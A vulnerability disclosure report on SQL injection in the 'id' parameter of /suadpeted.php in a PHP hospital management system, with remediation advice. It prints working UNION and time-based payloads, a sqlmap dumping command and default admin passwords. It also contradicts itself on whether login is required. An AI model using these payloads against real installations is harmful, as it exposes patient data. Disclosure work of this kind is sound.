# 1. Vulnerability Title

+ SQL Injection in Hospital Management System (PHP & MySQL) v1.0 – /suadpeted.php

# 2. Affected Product
	Name: Hospital Management System (PHP & MySQL) with Source Code
	Version: 1.0

# 3. Vendor Information
	Homepage: CodeZips Hospital Management System
	Download Source Code: GitHub Repository

# 4. Reporting Details
	Submitter: Emano888
	Vulnerable File: /suadpeted.php

# 5. Vulnerability Details
	Type: SQL Injection

## 5.1 Root Cause

+ A SQL injection vulnerability exists in the /suadpeted.php file of the Hospital Management System (PHP & MySQL) v1.0. The issue arises because the application directly incorporates user input from the id parameter into SQL queries without proper sanitization or validation. This lack of input handling allows attackers to manipulate SQL queries by injecting malicious code.

## 5.2 Impact

### Exploiting this SQL injection vulnerability can lead to:
	Unauthorized access to the database
	Sensitive data leakage
	Data tampering or deletion
	Complete system control
	Service disruptions

**These impacts pose a significant threat to the security and operational continuity of the affected system.**

## 5.3 Description

+ During a security assessment of the “Hospital Management System (PHP & MySQL) with Source Code,” a critical SQL injection vulnerability was identified in the /suadpeted.php file by Emano888. The vulnerability stems from inadequate validation of the id parameter, enabling attackers to inject malicious SQL statements. This flaw allows unauthorized database access, manipulation or deletion of data, and exposure of sensitive information. Immediate remediation is necessary to safeguard system integrity and data confidentiality.

# 6. Exploitation
+ No authentication or authorization is required to exploit this vulnerability.

# 7. Vulnerability Details and Proof of Concept (PoC)

## 7.1 Vulnerability Types
	UNION query SQL Injection
	Time-Based Blind SQL Injection

## 7.2 Vulnerable Parameter
	id

## 7.3 Payloads

**UNION query SQL Injection:**
```bash
id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a7a7071,0x73657866415a53574d77417650514d796479697172644f635575647a416457556a467a6c6a686c74,0x7162626a71),NULL,NULL,NULL,NULL,NULL-- -
```
**Time-Based Blind SQL Injection:**
```bash
id=1' AND (SELECT 9249 FROM (SELECT(SLEEP(5)))WEKj) AND 'rMFL'='rMFL
```
## 7.4 Exploitation Steps with sqlmap
```bash
python3 sqlmap.py -u "http://localhost/hospital-management-system-php-master/suadpeted.php?id=1" -p id --dbs --cookie=PHPSESSID=7aj3b5o39lk37uqms1g3oo4iqq
```

## Login is required to exploit the vulnerability

Credential:

superAdmin Password = 123

BasicAdmin Password = 123


**Screenshots from sqlmap Execution:**
![poc1](https://github.com/user-attachments/assets/ccbb882e-bf48-424e-b667-6d1eeba17405)

# 8. Recommendations for Remediation
**1.Use Prepared Statements and Parameterized Queries:**
+ Implementing prepared statements ensures that SQL queries are separated from user inputs, preventing malicious code execution.
**2.Input Validation and Sanitization:**
+ Rigorously validate and sanitize all user inputs to conform to expected formats and types before processing.
**3.Least Privilege Principle:**
+ Restrict database user permissions to the minimum required, avoiding the use of high-privilege accounts (e.g., root or admin) for routine operations.
**4.Regular Security Audits:**
+ Conduct periodic code reviews and security assessments to identify and remediate vulnerabilities promptly.

**Appendix**
+ Vendor Homepage: [Hospital Management System](https://codezips.com/php/hospital-management-system-in-php-and-mysql-with-source-code/)
+ Download Source Code: [GitHub Repository](https://codeload.github.com/codezips/hospital-management-system-php/zip/master)
